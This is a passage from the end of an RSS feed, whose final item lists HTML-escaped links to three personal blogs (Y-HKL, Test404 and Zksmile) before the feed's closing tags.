&lt;li>&lt;a href="https://y-hkl.github.io/?_blank">Y-HKL&amp;rsquo;s Blog&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.test404.com/?_blank">Test404&amp;rsquo;s Blog&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://zksmile.me/?_blank">Zksmile&amp;rsquo;s Blog&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>